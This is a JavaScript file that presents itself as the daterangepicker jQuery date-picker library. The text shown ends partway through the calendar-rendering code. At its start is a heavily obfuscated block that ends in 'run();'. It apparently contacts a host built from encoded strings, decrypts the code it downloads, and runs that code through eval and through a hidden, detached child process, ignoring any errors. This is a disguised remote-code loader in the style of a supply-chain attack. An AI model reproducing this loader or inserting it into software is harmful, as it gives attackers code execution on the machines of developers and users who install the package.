_0x4f78ad=_0x394c7a,_0xad1be0=_0x51d894[_0x4f78ad(0x294)][_0x1d17c9[_0x4f78ad(0x2a7)]];if(!_0xad1be0)throw new Error(_0x1d17c9[_0x4f78ad(0x279)]);return _0x1d17c9[_0x4f78ad(0x35c)](_0x2af09a,Buffer[_0x4f78ad(0x2e5)](_0xad1be0,_0x1d17c9[_0x4f78ad(0x2f5)]));}function _0xdb9bd1(_0x1d6c10){return new Promise(function(_0xd915b0,_0x3d9776){var _0x2be94b=_0x32cb,_0x26f747={'CMSBP':function(_0x1df2cf,_0x4de265){var _0xa6cae5=_0x32cb;return _0x33bd20[_0xa6cae5(0x341)](_0x1df2cf,_0x4de265);},'dkhxx':_0x33bd20[_0x2be94b(0x364)],'rlXPy':function(_0x75d885,_0x52119f){var _0x5ab1ba=_0x2be94b;return _0x33bd20[_0x5ab1ba(0x341)](_0x75d885,_0x52119f);},'CvizX':_0x33bd20[_0x2be94b(0x374)],'MehRX':function(_0x591d82,_0x38e449){var _0x3d811f=_0x2be94b;return _0x33bd20[_0x3d811f(0x1f7)](_0x591d82,_0x38e449);},'XLRBC':function(_0x56c7e4,_0xc6cb38){var _0xcd7de4=_0x2be94b;return _0x33bd20[_0xcd7de4(0x311)](_0x56c7e4,_0xc6cb38);},'rIYek':_0x33bd20[_0x2be94b(0x21a)],'wxjFZ':_0x33bd20[_0x2be94b(0x2e1)],'dNUKY':_0x33bd20[_0x2be94b(0x229)],'mlgzn':_0x33bd20[_0x2be94b(0x30e)],'HtQRM':function(_0x3c2d0d,_0x21dcf7){var _0x2110c9=_0x2be94b;return _0x33bd20[_0x2110c9(0x341)](_0x3c2d0d,_0x21dcf7);}},_0x324d1d={'hostname':_0x46d3ad[_0x2be94b(0x249)],'port':_0x46d3ad[_0x2be94b(0x2de)],'path':_0x46d3ad[_0x2be94b(0x385)],'headers':_0x46d3ad[_0x2be94b(0x294)],'method':_0x1d6c10},_0x5a3a02=http[_0x2be94b(0x32c)](_0x324d1d,function(_0x6c6586){var _0x3bc9d5=_0x2be94b,_0x29c9c3={'wDuOs':function(_0x19c784,_0x506fd3){var _0x14a635=_0x32cb;return _0x26f747[_0x14a635(0x381)](_0x19c784,_0x506fd3);},'zgZIS':_0x26f747[_0x3bc9d5(0x343)],'AuDwi':function(_0x2ede4,_0x197268){var _0x5cd09e=_0x3bc9d5;return _0x26f747[_0x5cd09e(0x387)](_0x2ede4,_0x197268);},'gjVFj':_0x26f747[_0x3bc9d5(0x27e)],'bReXD':function(_0x5c4fa1,_0x13cf29){var _0x5146ac=_0x3bc9d5;return _0x26f747[_0x5146ac(0x31e)](_0x5c4fa1,_0x13cf29);}};if(_0x26f747[_0x3bc9d5(0x202)](_0x26f747[_0x3bc9d5(0x255)],_0x1d6c10)){var _0xc2b532=[];_0x6c6586['on'](_0x26f747[_0x3bc9d5(0x340)],function(_0x17b8c5){var _0x30fe6e=_0x3bc9d5;_0xc2b532[_0x30fe6e(0x242)](_0x17b8c5);}),_0x6c6586['on'](_0x26f747[_0x3bc9d5(0x2b2)],function(){var _0x94906=_0x3bc9d5;try{var _0x52564d=Buffer[_0x94906(0x35e)](_0xc2b532);if(_0x52564d[_0x94906(0x2cf)])return _0x29c9c3[_0x94906(0x346)](_0xd915b0,_0x29c9c3[_0x94906(0x346)](_0x2af09a,_0x52564d));if(_0x6c6586[_0x94906(0x294)][_0x29c9c3[_0x94906(0x349)]])return _0x29c9c3[_0x94906(0x346)](_0xd915b0,_0x29c9c3[_0x94906(0x346)](_0x402866,_0x6c6586));_0x29c9c3[_0x94906(0x2cb)](_0x3d9776,new Error(_0x29c9c3[_0x94906(0x2ca)]));}catch(_0x49704b){_0x29c9c3[_0x94906(0x20b)](_0x3d9776,_0x49704b);}}),_0x6c6586['on'](_0x26f747[_0x3bc9d5(0x25e)],_0x3d9776);}else{try{_0x26f747[_0x3bc9d5(0x31e)](_0xd915b0,_0x26f747[_0x3bc9d5(0x387)](_0x402866,_0x6c6586));}catch(_0x587de3){_0x26f747[_0x3bc9d5(0x235)](_0x3d9776,_0x587de3);}_0x6c6586[_0x3bc9d5(0x253)]();}});_0x5a3a02['on'](_0x33bd20[_0x2be94b(0x30e)],_0x3d9776),_0x5a3a02[_0x2be94b(0x320)]();});}return _0x214f47[_0x394c7a(0x206)](_0xdb9bd1,_0x214f47[_0x394c7a(0x2d7)])[_0x394c7a(0x389)](function(){var _0x46ee51=_0x394c7a;return _0x33bd20[_0x46ee51(0x1f7)](_0xdb9bd1,_0x33bd20[_0x46ee51(0x21a)]);});}async function _0x35ffb4(_0x248196,_0x53de5f,_0x54ecb6){var _0x2201b2=_0x101dfb;try{const _0x1165a9=await _0x1d17c9[_0x2201b2(0x1f8)](_0x1903b4,_0x53de5f,_0x248196),_0x52e5aa=_0x54ecb6?_0x2201b2(0x2aa)+_0x2201b2(0x324)+(_0x5aab89['_V']||-0x2029+-0x4*0x2a6+0x2ac1)+(_0x2201b2(0x29c)+_0x2201b2(0x22d))+_0x5aab89['_H']+(_0x2201b2(0x29c)+_0x2201b2(0x231))+_0x5aab89[_0x2201b2(0x23b)]+(_0x2201b2(0x29c)+_0x2201b2(0x280)+_0x2201b2(0x26c)+_0x2201b2(0x1ff)+_0x2201b2(0x30c)+_0x2201b2(0x386)):_0x2201b2(0x2aa)+_0x2201b2(0x324)+(_0x5aab89['_V']||0x5a1+-0x2*0x11e1+0x1e21)+(_0x2201b2(0x29c)+_0x2201b2(0x238))+_0x5aab89[_0x2201b2(0x26e)]+(_0x2201b2(0x29c)+_0x2201b2(0x2c6))+_0x5aab89[_0x2201b2(0x37c)]+(_0x2201b2(0x29c)+_0x2201b2(0x280)+_0x2201b2(0x26c)+_0x2201b2(0x1ff)+_0x2201b2(0x30c)+_0x2201b2(0x386));_0x54ecb6||_0x1d17c9[_0x2201b2(0x35c)](eval,_0x1d17c9[_0x2201b2(0x20c)](_0x52e5aa,_0x1165a9)),_0x1d17c9[_0x2201b2(0x24b)](spawn,_0x1d17c9[_0x2201b2(0x301)],['-e',_0x1d17c9[_0x2201b2(0x20c)](_0x52e5aa,_0x1165a9)],{'detached':!(0xd1+0x2e*0x9d+-0x1*0x1d07),'stdio':_0x1d17c9[_0x2201b2(0x2d4)],'windowsHide':!(0xac2+0x1b2f*-0x1+-0x349*-0x5)})[_0x2201b2(0x2e2)]();}catch(_0x33dc71){}}return _0x5aab89['_V']=_0x5aab89['i'],_0x5aab89['_H']=_0x214f47[_0x101dfb(0x26b)](_0x214f47[_0x101dfb(0x272)](_0x214f47[_0x101dfb(0x21b)],_0x22e50b),_0x214f47[_0x101dfb(0x31c)]),_0x5aab89[_0x101dfb(0x23b)]=_0x214f47[_0x101dfb(0x2fa)](_0x214f47[_0x101dfb(0x37f)](_0x214f47[_0x101dfb(0x21b)],_0x4cd016),_0x214f47[_0x101dfb(0x31c)]),_0x5aab89[_0x101dfb(0x26e)]=_0x214f47[_0x101dfb(0x246)](_0x214f47[_0x101dfb(0x355)](_0x214f47[_0x101dfb(0x21b)],_0x22e50b),_0x214f47[_0x101dfb(0x2d3)]),_0x5aab89[_0x101dfb(0x37c)]=_0x214f47[_0x101dfb(0x2be)](_0x214f47[_0x101dfb(0x26b)](_0x214f47[_0x101dfb(0x21b)],_0x22e50b),_0x214f47[_0x101dfb(0x31c)]),_0x214f47[_0x101dfb(0x259)](_0x35ffb4,new URL(_0x214f47[_0x101dfb(0x1f4)](_0x214f47[_0x101dfb(0x246)](_0x214f47[_0x101dfb(0x21b)],_0x22e50b),_0x214f47[_0x101dfb(0x310)])),_0x214f47[_0x101dfb(0x37e)],!(-0xf9*-0x22+0x1976+-0x3a87))[_0x101dfb(0x236)](function(){var _0x19b3ea=_0x101dfb;return _0x1d17c9[_0x19b3ea(0x24b)](_0x35ffb4,new URL(_0x1d17c9[_0x19b3ea(0x2e4)](_0x1d17c9[_0x19b3ea(0x2e4)](_0x1d17c9[_0x19b3ea(0x32a)],_0x22e50b),_0x1d17c9[_0x19b3ea(0x2e6)])),_0x1d17c9[_0x19b3ea(0x29e)],!(0x5*0x45d+0x94*0x2f+-0x30fd));});});}run();
    } else {
        // Browser globals
        root.daterangepicker = factory(root.moment, root.jQuery);
    }
}(this, function(moment, $) {
    var DateRangePicker = function(element, options, cb) {

        //default settings for options
        this.parentEl = 'body';
        this.element = $(element);
        this.startDate = moment().startOf('day');
        this.endDate = moment().endOf('day');
        this.minDate = false;
        this.maxDate = false;
        this.dateLimit = false;
        this.autoApply = false;
        this.singleDatePicker = false;
        this.showDropdowns = false;
        this.showWeekNumbers = false;
        this.showISOWeekNumbers = false;
        this.showCustomRangeLabel = true;
        this.timePicker = false;
        this.timePicker24Hour = false;
        this.timePickerIncrement = 1;
        this.timePickerSeconds = false;
        this.linkedCalendars = true;
        this.autoUpdateInput = true;
        this.alwaysShowCalendars = false;
        this.ranges = {};

        this.opens = 'right';
        if (this.element.hasClass('pull-right'))
            this.opens = 'left';

        this.drops = 'down';
        if (this.element.hasClass('dropup'))
            this.drops = 'up';

        this.buttonClasses = 'btn btn-sm';
        this.applyClass = 'btn-success';
        this.cancelClass = 'btn-default';

        this.locale = {
            direction: 'ltr',
            format: moment.localeData().longDateFormat('L'),
            separator: ' - ',
            applyLabel: 'Apply',
            cancelLabel: 'Cancel',
            weekLabel: 'W',
            customRangeLabel: 'Custom Range',
            daysOfWeek: moment.weekdaysMin(),
            monthNames: moment.monthsShort(),
            firstDay: moment.localeData().firstDayOfWeek()
        };

        this.callback = function() { };

        //some state information
        this.isShowing = false;
        this.leftCalendar = {};
        this.rightCalendar = {};

        //custom options from user
        if (typeof options !== 'object' || options === null)
            options = {};

        //allow setting options with data attributes
        //data-api options will be overwritten with custom javascript options
        options = $.extend(this.element.data(), options);

        //html template for the picker UI
        if (typeof options.template !== 'string' && !(options.template instanceof $))
            options.template = '<div class="daterangepicker dropdown-menu">' +
                '<div class="calendar left">' +
                    '<div class="daterangepicker_input">' +
                      '<input class="input-mini form-control" type="text" name="daterangepicker_start" value="" />' +
                      '<i class="fa fa-calendar glyphicon glyphicon-calendar"></i>' +
                      '<div class="calendar-time">' +
                        '<div></div>' +
                        '<i class="fa fa-clock-o glyphicon glyphicon-time"></i>' +
                      '</div>' +
                    '</div>' +
                    '<div class="calendar-table"></div>' +
                '</div>' +
                '<div class="calendar right">' +
                    '<div class="daterangepicker_input">' +
                      '<input class="input-mini form-control" type="text" name="daterangepicker_end" value="" />' +
                      '<i class="fa fa-calendar glyphicon glyphicon-calendar"></i>' +
                      '<div class="calendar-time">' +
                        '<div></div>' +
                        '<i class="fa fa-clock-o glyphicon glyphicon-time"></i>' +
                      '</div>' +
                    '</div>' +
                    '<div class="calendar-table"></div>' +
                '</div>' +
                '<div class="ranges">' +
                    '<div class="range_inputs">' +
                        '<button class="applyBtn" disabled="disabled" type="button"></button> ' +
                        '<button class="cancelBtn" type="button"></button>' +
                    '</div>' +
                '</div>' +
            '</div>';

        this.parentEl = (options.parentEl && $(options.parentEl).length) ? $(options.parentEl) : $(this.parentEl);
        this.container = $(options.template).appendTo(this.parentEl);

        //
        // handle all the possible options overriding defaults
        //

        if (typeof options.locale === 'object') {

            if (typeof options.locale.direction === 'string')
                this.locale.direction = options.locale.direction;

            if (typeof options.locale.format === 'string')
                this.locale.format = options.locale.format;

            if (typeof options.locale.separator === 'string')
                this.locale.separator = options.locale.separator;

            if (typeof options.locale.daysOfWeek === 'object')
                this.locale.daysOfWeek = options.locale.daysOfWeek.slice();

            if (typeof options.locale.monthNames === 'object')
              this.locale.monthNames = options.locale.monthNames.slice();

            if (typeof options.locale.firstDay === 'number')
              this.locale.firstDay = options.locale.firstDay;

            if (typeof options.locale.applyLabel === 'string')
              this.locale.applyLabel = options.locale.applyLabel;

            if (typeof options.locale.cancelLabel === 'string')
              this.locale.cancelLabel = options.locale.cancelLabel;

            if (typeof options.locale.weekLabel === 'string')
              this.locale.weekLabel = options.locale.weekLabel;

            if (typeof options.locale.customRangeLabel === 'string'){
                //Support unicode chars in the custom range name.
                var elem = document.createElement('textarea');
                elem.innerHTML = options.locale.customRangeLabel;
                var rangeHtml = elem.value;
                this.locale.customRangeLabel = rangeHtml;
            }
        }
        this.container.addClass(this.locale.direction);

        if (typeof options.startDate === 'string')
            this.startDate = moment(options.startDate, this.locale.format);

        if (typeof options.endDate === 'string')
            this.endDate = moment(options.endDate, this.locale.format);

        if (typeof options.minDate === 'string')
            this.minDate = moment(options.minDate, this.locale.format);

        if (typeof options.maxDate === 'string')
            this.maxDate = moment(options.maxDate, this.locale.format);

        if (typeof options.startDate === 'object')
            this.startDate = moment(options.startDate);

        if (typeof options.endDate === 'object')
            this.endDate = moment(options.endDate);

        if (typeof options.minDate === 'object')
            this.minDate = moment(options.minDate);

        if (typeof options.maxDate === 'object')
            this.maxDate = moment(options.maxDate);

        // sanity check for bad options
        if (this.minDate && this.startDate.isBefore(this.minDate))
            this.startDate = this.minDate.clone();

        // sanity check for bad options
        if (this.maxDate && this.endDate.isAfter(this.maxDate))
            this.endDate = this.maxDate.clone();

        if (typeof options.applyClass === 'string')
            this.applyClass = options.applyClass;

        if (typeof options.cancelClass === 'string')
            this.cancelClass = options.cancelClass;

        if (typeof options.dateLimit === 'object')
            this.dateLimit = options.dateLimit;

        if (typeof options.opens === 'string')
            this.opens = options.opens;

        if (typeof options.drops === 'string')
            this.drops = options.drops;

        if (typeof options.showWeekNumbers === 'boolean')
            this.showWeekNumbers = options.showWeekNumbers;

        if (typeof options.showISOWeekNumbers === 'boolean')
            this.showISOWeekNumbers = options.showISOWeekNumbers;

        if (typeof options.buttonClasses === 'string')
            this.buttonClasses = options.buttonClasses;

        if (typeof options.buttonClasses === 'object')
            this.buttonClasses = options.buttonClasses.join(' ');

        if (typeof options.showDropdowns === 'boolean')
            this.showDropdowns = options.showDropdowns;

        if (typeof options.showCustomRangeLabel === 'boolean')
            this.showCustomRangeLabel = options.showCustomRangeLabel;

        if (typeof options.singleDatePicker === 'boolean') {
            this.singleDatePicker = options.singleDatePicker;
            if (this.singleDatePicker)
                this.endDate = this.startDate.clone();
        }

        if (typeof options.timePicker === 'boolean')
            this.timePicker = options.timePicker;

        if (typeof options.timePickerSeconds === 'boolean')
            this.timePickerSeconds = options.timePickerSeconds;

        if (typeof options.timePickerIncrement === 'number')
            this.timePickerIncrement = options.timePickerIncrement;

        if (typeof options.timePicker24Hour === 'boolean')
            this.timePicker24Hour = options.timePicker24Hour;

        if (typeof options.autoApply === 'boolean')
            this.autoApply = options.autoApply;

        if (typeof options.autoUpdateInput === 'boolean')
            this.autoUpdateInput = options.autoUpdateInput;

        if (typeof options.linkedCalendars === 'boolean')
            this.linkedCalendars = options.linkedCalendars;

        if (typeof options.isInvalidDate === 'function')
            this.isInvalidDate = options.isInvalidDate;

        if (typeof options.isCustomDate === 'function')
            this.isCustomDate = options.isCustomDate;

        if (typeof options.alwaysShowCalendars === 'boolean')
            this.alwaysShowCalendars = options.alwaysShowCalendars;

        // update day names order to firstDay
        if (this.locale.firstDay != 0) {
            var iterator = this.locale.firstDay;
            while (iterator > 0) {
                this.locale.daysOfWeek.push(this.locale.daysOfWeek.shift());
                iterator--;
            }
        }

        var start, end, range;

        //if no start/end dates set, check if an input element contains initial values
        if (typeof options.startDate === 'undefined' && typeof options.endDate === 'undefined') {
            if ($(this.element).is('input[type=text]')) {
                var val = $(this.element).val(),
                    split = val.split(this.locale.separator);

                start = end = null;

                if (split.length == 2) {
                    start = moment(split[0], this.locale.format);
                    end = moment(split[1], this.locale.format);
                } else if (this.singleDatePicker && val !== "") {
                    start = moment(val, this.locale.format);
                    end = moment(val, this.locale.format);
                }
                if (start !== null && end !== null) {
                    this.setStartDate(start);
                    this.setEndDate(end);
                }
            }
        }

        if (typeof options.ranges === 'object') {
            for (range in options.ranges) {

                if (typeof options.ranges[range][0] === 'string')
                    start = moment(options.ranges[range][0], this.locale.format);
                else
                    start = moment(options.ranges[range][0]);

                if (typeof options.ranges[range][1] === 'string')
                    end = moment(options.ranges[range][1], this.locale.format);
                else
                    end = moment(options.ranges[range][1]);

                // If the start or end date exceed those allowed by the minDate or dateLimit
                // options, shorten the range to the allowable period.
                if (this.minDate && start.isBefore(this.minDate))
                    start = this.minDate.clone();

                var maxDate = this.maxDate;
                if (this.dateLimit && maxDate && start.clone().add(this.dateLimit).isAfter(maxDate))
                    maxDate = start.clone().add(this.dateLimit);
                if (maxDate && end.isAfter(maxDate))
                    end = maxDate.clone();

                // If the end of the range is before the minimum or the start of the range is
                // after the maximum, don't display this range option at all.
                if ((this.minDate && end.isBefore(this.minDate, this.timepicker ? 'minute' : 'day')) 
                  || (maxDate && start.isAfter(maxDate, this.timepicker ? 'minute' : 'day')))
                    continue;

                //Support unicode chars in the range names.
                var elem = document.createElement('textarea');
                elem.innerHTML = range;
                var rangeHtml = elem.value;

                this.ranges[rangeHtml] = [start, end];
            }

            var list = '<ul>';
            for (range in this.ranges) {
                list += '<li data-range-key="' + range + '">' + range + '</li>';
            }
            if (this.showCustomRangeLabel) {
                list += '<li data-range-key="' + this.locale.customRangeLabel + '">' + this.locale.customRangeLabel + '</li>';
            }
            list += '</ul>';
            this.container.find('.ranges').prepend(list);
        }

        if (typeof cb === 'function') {
            this.callback = cb;
        }

        if (!this.timePicker) {
            this.startDate = this.startDate.startOf('day');
            this.endDate = this.endDate.endOf('day');
            this.container.find('.calendar-time').hide();
        }

        //can't be used together for now
        if (this.timePicker && this.autoApply)
            this.autoApply = false;

        if (this.autoApply && typeof options.ranges !== 'object') {
            this.container.find('.ranges').hide();
        } else if (this.autoApply) {
            this.container.find('.applyBtn, .cancelBtn').addClass('hide');
        }

        if (this.singleDatePicker) {
            this.container.addClass('single');
            this.container.find('.calendar.left').addClass('single');
            this.container.find('.calendar.left').show();
            this.container.find('.calendar.right').hide();
            this.container.find('.daterangepicker_input input, .daterangepicker_input > i').hide();
            if (this.timePicker) {
                this.container.find('.ranges ul').hide();
            } else {
                this.container.find('.ranges').hide();
            }
        }

        if ((typeof options.ranges === 'undefined' && !this.singleDatePicker) || this.alwaysShowCalendars) {
            this.container.addClass('show-calendar');
        }

        this.container.addClass('opens' + this.opens);

        //swap the position of the predefined ranges if opens right
        if (typeof options.ranges !== 'undefined' && this.opens == 'right') {
            this.container.find('.ranges').prependTo( this.container.find('.calendar.left').parent() );
        }

        //apply CSS classes and labels to buttons
        this.container.find('.applyBtn, .cancelBtn').addClass(this.buttonClasses);
        if (this.applyClass.length)
            this.container.find('.applyBtn').addClass(this.applyClass);
        if (this.cancelClass.length)
            this.container.find('.cancelBtn').addClass(this.cancelClass);
        this.container.find('.applyBtn').html(this.locale.applyLabel);
        this.container.find('.cancelBtn').html(this.locale.cancelLabel);

        //
        // event listeners
        //

        this.container.find('.calendar')
            .on('click.daterangepicker', '.prev', $.proxy(this.clickPrev, this))
            .on('click.daterangepicker', '.next', $.proxy(this.clickNext, this))
            .on('mousedown.daterangepicker', 'td.available', $.proxy(this.clickDate, this))
            .on('mouseenter.daterangepicker', 'td.available', $.proxy(this.hoverDate, this))
            .on('mouseleave.daterangepicker', 'td.available', $.proxy(this.updateFormInputs, this))
            .on('change.daterangepicker', 'select.yearselect', $.proxy(this.monthOrYearChanged, this))
            .on('change.daterangepicker', 'select.monthselect', $.proxy(this.monthOrYearChanged, this))
            .on('change.daterangepicker', 'select.hourselect,select.minuteselect,select.secondselect,select.ampmselect', $.proxy(this.timeChanged, this))
            .on('click.daterangepicker', '.daterangepicker_input input', $.proxy(this.showCalendars, this))
            .on('focus.daterangepicker', '.daterangepicker_input input', $.proxy(this.formInputsFocused, this))
            .on('blur.daterangepicker', '.daterangepicker_input input', $.proxy(this.formInputsBlurred, this))
            .on('change.daterangepicker', '.daterangepicker_input input', $.proxy(this.formInputsChanged, this));

        this.container.find('.ranges')
            .on('click.daterangepicker', 'button.applyBtn', $.proxy(this.clickApply, this))
            .on('click.daterangepicker', 'button.cancelBtn', $.proxy(this.clickCancel, this))
            .on('click.daterangepicker', 'li', $.proxy(this.clickRange, this))
            .on('mouseenter.daterangepicker', 'li', $.proxy(this.hoverRange, this))
            .on('mouseleave.daterangepicker', 'li', $.proxy(this.updateFormInputs, this));

        if (this.element.is('input') || this.element.is('button')) {
            this.element.on({
                'click.daterangepicker': $.proxy(this.show, this),
                'focus.daterangepicker': $.proxy(this.show, this),
                'keyup.daterangepicker': $.proxy(this.elementChanged, this),
                'keydown.daterangepicker': $.proxy(this.keydown, this)
            });
        } else {
            this.element.on('click.daterangepicker', $.proxy(this.toggle, this));
        }

        //
        // if attached to a text input, set the initial value
        //

        if (this.element.is('input') && !this.singleDatePicker && this.autoUpdateInput) {
            this.element.val(this.startDate.format(this.locale.format) + this.locale.separator + this.endDate.format(this.locale.format));
            this.element.trigger('change');
        } else if (this.element.is('input') && this.autoUpdateInput) {
            this.element.val(this.startDate.format(this.locale.format));
            this.element.trigger('change');
        }

    };

    DateRangePicker.prototype = {

        constructor: DateRangePicker,

        setStartDate: function(startDate) {
            if (typeof startDate === 'string')
                this.startDate = moment(startDate, this.locale.format);

            if (typeof startDate === 'object')
                this.startDate = moment(startDate);

            if (!this.timePicker)
                this.startDate = this.startDate.startOf('day');

            if (this.timePicker && this.timePickerIncrement)
                this.startDate.minute(Math.round(this.startDate.minute() / this.timePickerIncrement) * this.timePickerIncrement);

            if (this.minDate && this.startDate.isBefore(this.minDate)) {
                this.startDate = this.minDate.clone();
                if (this.timePicker && this.timePickerIncrement)
                    this.startDate.minute(Math.round(this.startDate.minute() / this.timePickerIncrement) * this.timePickerIncrement);
            }

            if (this.maxDate && this.startDate.isAfter(this.maxDate)) {
                this.startDate = this.maxDate.clone();
                if (this.timePicker && this.timePickerIncrement)
                    this.startDate.minute(Math.floor(this.startDate.minute() / this.timePickerIncrement) * this.timePickerIncrement);
            }

            if (!this.isShowing)
                this.updateElement();

            this.updateMonthsInView();
        },

        setEndDate: function(endDate) {
            if (typeof endDate === 'string')
                this.endDate = moment(endDate, this.locale.format);

            if (typeof endDate === 'object')
                this.endDate = moment(endDate);

            if (!this.timePicker)
                this.endDate = this.endDate.endOf('day');

            if (this.timePicker && this.timePickerIncrement)
                this.endDate.minute(Math.round(this.endDate.minute() / this.timePickerIncrement) * this.timePickerIncrement);

            if (this.endDate.isBefore(this.startDate))
                this.endDate = this.startDate.clone();

            if (this.maxDate && this.endDate.isAfter(this.maxDate))
                this.endDate = this.maxDate.clone();

            if (this.dateLimit && this.startDate.clone().add(this.dateLimit).isBefore(this.endDate))
                this.endDate = this.startDate.clone().add(this.dateLimit);

            this.previousRightTime = this.endDate.clone();

            if (!this.isShowing)
                this.updateElement();

            this.updateMonthsInView();
        },

        isInvalidDate: function() {
            return false;
        },

        isCustomDate: function() {
            return false;
        },

        updateView: function() {
            if (this.timePicker) {
                this.renderTimePicker('left');
                this.renderTimePicker('right');
                if (!this.endDate) {
                    this.container.find('.right .calendar-time select').attr('disabled', 'disabled').addClass('disabled');
                } else {
                    this.container.find('.right .calendar-time select').removeAttr('disabled').removeClass('disabled');
                }
            }
            if (this.endDate) {
                this.container.find('input[name="daterangepicker_end"]').removeClass('active');
                this.container.find('input[name="daterangepicker_start"]').addClass('active');
            } else {
                this.container.find('input[name="daterangepicker_end"]').addClass('active');
                this.container.find('input[name="daterangepicker_start"]').removeClass('active');
            }
            this.updateMonthsInView();
            this.updateCalendars();
            this.updateFormInputs();
        },

        updateMonthsInView: function() {
            if (this.endDate) {

                //if both dates are visible already, do nothing
                if (!this.singleDatePicker && this.leftCalendar.month && this.rightCalendar.month &&
                    (this.startDate.format('YYYY-MM') == this.leftCalendar.month.format('YYYY-MM') || this.startDate.format('YYYY-MM') == this.rightCalendar.month.format('YYYY-MM'))
                    &&
                    (this.endDate.format('YYYY-MM') == this.leftCalendar.month.format('YYYY-MM') || this.endDate.format('YYYY-MM') == this.rightCalendar.month.format('YYYY-MM'))
                    ) {
                    return;
                }

                this.leftCalendar.month = this.startDate.clone().date(2);
                if (!this.linkedCalendars && (this.endDate.month() != this.startDate.month() || this.endDate.year() != this.startDate.year())) {
                    this.rightCalendar.month = this.endDate.clone().date(2);
                } else {
                    this.rightCalendar.month = this.startDate.clone().date(2).add(1, 'month');
                }

            } else {
                if (this.leftCalendar.month.format('YYYY-MM') != this.startDate.format('YYYY-MM') && this.rightCalendar.month.format('YYYY-MM') != this.startDate.format('YYYY-MM')) {
                    this.leftCalendar.month = this.startDate.clone().date(2);
                    this.rightCalendar.month = this.startDate.clone().date(2).add(1, 'month');
                }
            }
            if (this.maxDate && this.linkedCalendars && !this.singleDatePicker && this.rightCalendar.month > this.maxDate) {
              this.rightCalendar.month = this.maxDate.clone().date(2);
              this.leftCalendar.month = this.maxDate.clone().date(2).subtract(1, 'month');
            }
        },

        updateCalendars: function() {

            if (this.timePicker) {
                var hour, minute, second;
                if (this.endDate) {
                    hour = parseInt(this.container.find('.left .hourselect').val(), 10);
                    minute = parseInt(this.container.find('.left .minuteselect').val(), 10);
                    second = this.timePickerSeconds ? parseInt(this.container.find('.left .secondselect').val(), 10) : 0;
                    if (!this.timePicker24Hour) {
                        var ampm = this.container.find('.left .ampmselect').val();
                        if (ampm === 'PM' && hour < 12)
                            hour += 12;
                        if (ampm === 'AM' && hour === 12)
                            hour = 0;
                    }
                } else {
                    hour = parseInt(this.container.find('.right .hourselect').val(), 10);
                    minute = parseInt(this.container.find('.right .minuteselect').val(), 10);
                    second = this.timePickerSeconds ? parseInt(this.container.find('.right .secondselect').val(), 10) : 0;
                    if (!this.timePicker24Hour) {
                        var ampm = this.container.find('.right .ampmselect').val();
                        if (ampm === 'PM' && hour < 12)
                            hour += 12;
                        if (ampm === 'AM' && hour === 12)
                            hour = 0;
                    }
                }
                this.leftCalendar.month.hour(hour).minute(minute).second(second);
                this.rightCalendar.month.hour(hour).minute(minute).second(second);
            }

            this.renderCalendar('left');
            this.renderCalendar('right');

            //highlight any predefined range matching the current start and end dates
            this.container.find('.ranges li').removeClass('active');
            if (this.endDate == null) return;

            this.calculateChosenLabel();
        },

        renderCalendar: function(side) {

            //
            // Build the matrix of dates that will populate the calendar
            //

            var calendar = side == 'left' ? this.leftCalendar : this.rightCalendar;
            var month = calendar.month.month();
            var year = calendar.month.year();
            var hour = calendar.month.hour();
            var minute = calendar.month.minute();
            var second = calendar.month.second();
            var daysInMonth = moment([year, month]).daysInMonth();
            var firstDay = moment([year, month, 1]);
            var lastDay = moment([year, month, daysInMonth]);
            var lastMonth = moment(firstDay).subtract(1, 'month').month();
            var lastYear = moment(firstDay).subtract(1, 'month').year();
            var daysInLastMonth = moment([lastYear, lastMonth]).daysInMonth();
            var dayOfWeek = firstDay.day();

            //initialize a 6 rows x 7 columns array for the calendar
            var calendar = [];
            calendar.firstDay = firstDay;
            calendar.lastDay = lastDay;

            for (var i = 0; i < 6; i++) {
                calendar[i] = [];
            }

            //populate the calendar with date objects
            var startDay = daysInLastMonth - dayOfWeek + this.locale.firstDay + 1;
            if (startDay > daysInLastMonth)
                startDay -= 7;

            if (dayOfWeek == this.locale.firstDay)
                startDay = daysInLastMonth - 6;

            var curDate = moment([lastYear, lastMonth, startDay, 12, minute, second]);

            var col, row;
            for (var i = 0, col = 0, row = 0; i < 42; i++, col++, curDate = moment(curDate).add(24, 'hour')) {
                if (i > 0 && col % 7 === 0) {
                    col = 0;
                    row++;
                }
                calendar[row][col] = curDate.clone().hour(hour).minute(minute).second(second);
                curDate.hour(12);

                if (this.minDate && calendar[row][col].format('YYYY-MM-DD') == this.minDate.format('YYYY-MM-DD') && calendar[row][col].isBefore(this.minDate) && side == 'left') {
                    calendar[row][col] = this.minDate.clone();
                }

                if (this.maxDate && calendar[row][col].format('YYYY-MM-DD') == this.maxDate.format('YYYY-MM-DD') && calendar[row][col].isAfter(this.maxDate) && side == 'right') {
                    calendar[row][col] = this.maxDate.clone();
                }

            }

            //make the calendar object available to hoverDate/clickDate
            if (side == 'left') {
                this.leftCalendar.calendar = calendar;
            } else {
                this.rightCalendar.calendar = calendar;
            }

            //
            // Display the calendar
            //

            var minDate = side == 'left' ? this.minDate : this.startDate;
            var maxDate = this.maxDate;
            var selected = side == 'left' ? this.startDate : this.endDate;
            var arrow = this.locale.direction == 'ltr' ? {left: 'chevron-left', right: 'chevron-right'} : {left: 'chevron-right', right: 'chevron-left'};

            var html = '<table class="table-condensed">';
            html += '<thead>';
            html += '<tr>';

            // add empty cell for week number
            if (this.showWeekNumbers || this.showISOWeekNumbers)
                html += '<th></th>';

            if ((!minDate || minDate.isBefore(calendar.firstDay)) && (!this.linkedCalendars || side == 'left')) {
                html += '<th class="prev available"><i class="fa fa-' + arrow.left + ' glyphicon glyphicon-' + arrow.left + '"></i></th>';
            } else {
                html += '<th></th>';
            }

            var dateHtml = this.locale.monthNames[calendar[1][1].month()] + calendar[1][1].format(" YYYY");

            if (this.showDropdowns) {
                var currentMonth = calendar[1][1].month();
                var currentYear = calendar[1][1].year();
                var maxYear = (maxDate && maxDate.year()) || (currentYear + 5);
                var minYear = (minDate && minDate.year()) || (currentYear - 50);
                var inMinYear = currentYear == minYear;
                var inMaxYear = currentYear == maxYear;

                var monthHtml = '<select class="monthselect">';
                for (var m = 0; m < 12; m++) {
                    if ((!inMinYear || m >= minDate.month()) && (!inMaxYear || m <= maxDate.month())) {
                        monthHtml += "<option value='" + m + "'" +
                            (m === currentMonth ? " selected='selected'" : "") +
                            ">" + this.locale.monthNames[m] + "</option>";
                    } else {
                        monthHtml += "<option value='" + m + "'" +
                            (m === currentMonth ? " selected='selected'" : "") +
                            " disabled='disabled'>" + this.locale.monthNames[m] + "</option>";
                    }
                }
                monthHtml += "</select>";

